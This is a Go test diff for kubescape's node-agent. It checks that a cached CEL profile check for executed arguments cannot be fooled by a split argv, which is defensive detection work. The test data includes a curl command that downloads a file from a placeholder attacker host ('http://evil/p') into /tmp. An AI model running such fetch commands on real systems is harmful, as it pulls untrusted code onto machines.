@@ -10,7 +10,9 @@ import (
 	objectcachev1 "github.com/kubescape/node-agent/pkg/objectcache/v1"
 	"github.com/kubescape/node-agent/pkg/rulemanager/cel/libraries/cache"
 	"github.com/kubescape/storage/pkg/apis/softwarecomposition/v1beta1"
+	"github.com/kubescape/storage/pkg/registry/file/dynamicpathdetector"
 	"github.com/stretchr/testify/assert"
+	"github.com/stretchr/testify/require"
 )
 
 func TestApplicationProfileCaching(t *testing.T) {
@@ -459,4 +461,47 @@ func TestApplicationProfileCacheClearCache(t *testing.T) {
 
 	cacheSize3 := lib.functionCache.GetCacheStats()
 	assert.Equal(t, 1, cacheSize3, "Cache should have 1 entry after repopulation")
+}
+
+// R0040 alerts when cp.was_executed_with_args is false. A process must not be
+// able to prime the cache with an argv that matches the profile and then run a
+// different argv that prints the same: the profile allows curl with exactly one
+// argument, so the split argv must still be reported as not matching.
+func TestWasExecutedWithArgs_CacheKeepsArgvBoundaries(t *testing.T) {
+	objCache := objectcachev1.RuleObjectCacheMock{
+		ContainerIDToSharedData: maps.NewSafeMap[string, *objectcache.WatchedContainerData](),
+	}
+	objCache.SetSharedContainerData("test-container-id", &objectcache.WatchedContainerData{
+		ContainerType: objectcache.Container,
+		ContainerInfos: map[objectcache.ContainerType][]objectcache.ContainerInfo{
+			objectcache.Container: {{Name: "test-container"}},
+		},
+	})
+	profile := &v1beta1.ContainerProfile{}
+	profile.Spec.Execs = []v1beta1.ExecCalls{{Path: "/usr/bin/curl", Args: []string{"curl", dynamicpathdetector.DynamicIdentifier}}}
+	objCache.SetContainerProfile(profile)
+
+	lib := &containerProfileLibrary{
+		objectCache:   &objCache,
+		functionCache: cache.NewFunctionCache(cache.DefaultFunctionCacheConfig()),
+	}
+	env, err := cel.NewEnv(
+		cel.Variable("containerID", cel.StringType),
+		cel.Variable("path", cel.StringType),
+		cel.Variable("args", cel.ListType(cel.StringType)),
+		cel.Lib(lib),
+	)
+	require.NoError(t, err)
+	ast, issues := env.Compile(`cp.was_executed_with_args(containerID, path, args)`)
+	require.NoError(t, issues.Err())
+	program, err := env.Program(ast)
+	require.NoError(t, err)
+	eval := func(args []string) any {
+		out, _, err := program.Eval(map[string]any{"containerID": "test-container-id", "path": "/usr/bin/curl", "args": args})
+		require.NoError(t, err)
+		return out.Value()
+	}
+
+	assert.Equal(t, true, eval([]string{"curl", "-o /tmp/x http://evil/p"}), "one argument matches the profile")
+	assert.Equal(t, false, eval([]string{"curl", "-o", "/tmp/x", "http://evil/p"}), "four arguments don't, even right after the one-argument call")
 }
